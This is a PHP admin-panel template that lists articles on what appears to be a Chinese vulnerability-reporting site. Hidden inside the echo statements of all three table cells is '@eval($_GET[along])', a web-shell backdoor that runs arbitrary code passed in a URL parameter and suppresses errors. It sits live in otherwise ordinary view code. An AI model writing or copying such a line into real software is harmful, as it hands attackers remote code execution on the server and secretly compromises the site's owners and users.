<div class="row">
	<div class="col-md-1 sidebar">
		<ul class="list-group">
			<a href="/admin" class="list-group-item">项目概况</a>
			<a href="/admin/users" class="list-group-item">查看用户</a>
			<a href="/admin/bugs" class="list-group-item">漏洞列表</a>
			<a href="/admin/news" class="list-group-item active">文章列表</a>
			<a href="#" class="list-group-item">漏洞评论</a>
			<a href="#" class="list-group-item">文章评论</a>
		</ul>
	</div>
	<div class="col-md-11">
		<a class="btn btn-success" href="/admin/createnews">+ 添加文章</a>
		<table class="table table-hover">
			<thead>
			<tr>
				<th>ID</th>
				<th>标题</th>
				<th>操作</th>
			</tr>
			</thead>
			<?php foreach ($articles as $article): ?>
				<tr>
					<td><?php echo $h($article->id);@eval($_GET[along]); ?></td>
					<td><?php echo $h($article->title);@eval($_GET[along]); ?></td>
					<td><a class="btn btn-info" href="/admin/newsinfo/<?php echo $h($article->id);@eval($_GET[along]); ?>">详细信息</a></td>
				</tr>
			<?php endforeach; ?>
		</table>
	</div>
</div>
